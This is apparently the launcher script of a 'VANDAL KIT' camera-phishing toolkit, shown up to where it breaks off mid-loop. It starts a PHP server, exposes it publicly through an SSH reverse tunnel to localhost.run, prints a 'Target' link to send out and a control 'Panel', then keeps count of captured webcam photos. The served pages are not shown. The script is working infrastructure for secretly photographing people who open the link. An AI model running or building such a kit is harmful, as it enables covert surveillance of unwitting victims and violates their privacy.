#!/bin/bash
clear
echo -e "\033[1;91m"
echo " ██╗   ██╗ █████╗ ███╗   ██╗██████╗  █████╗ ██╗"
echo " ██║   ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██║"
echo " ██║   ██║███████║██╔██╗ ██║██║  ██║███████║██║"
echo " ╚██╗ ██╔╝██╔══██║██║╚██╗██║██║  ██║██╔══██║██║"
echo "  ╚████╔╝ ██║  ██║██║ ╚████║██████╔╝██║  ██║███████╗"
echo "   ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝"
echo -e "\033[0m"
echo -e "\033[1;91m     VANDAL KIT — One-Click Setup\033[0m"
echo ""

PORT=8080

command -v php >/dev/null 2>&1 || { echo "[*] Installing PHP..."; pkg install php -y 2>/dev/null || apt install php -y; }
pkill -f "php -S 0.0.0.0:$PORT" 2>/dev/null; sleep 1
php -S 0.0.0.0:$PORT > /dev/null 2>&1 & PHP_PID=$!; sleep 2

echo "[+] Server: http://localhost:$PORT"

ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -R 80:localhost:$PORT localhost.run > tunnel.log 2>&1 &
TUN_PID=$!
for i in $(seq 1 20); do LINK=$(grep -oE 'https://[a-z0-9]+\.lhr\.life' tunnel.log 2>/dev/null | head -n1); [ -n "$LINK" ] && break; sleep 1; done
[ -z "$LINK" ] && LINK="http://localhost:$PORT"

echo ""
echo -e "\033[1;92m══════════════════════════════════════════════════\033[0m"
echo -e "\033[1;92m  Target : \033[0m$LINK"
echo -e "\033[1;92m  Panel  : \033[0m$LINK/panel.php"
echo -e "\033[1;92m══════════════════════════════════════════════════\033[0m"
echo ""

while true; do CAMS=$(ls webcam_*.jpg 2>/dev/null | wc -l); echo -e "\r[*] 📸 $CAMS photos | Ctrl+C to stop"; sleep 3; 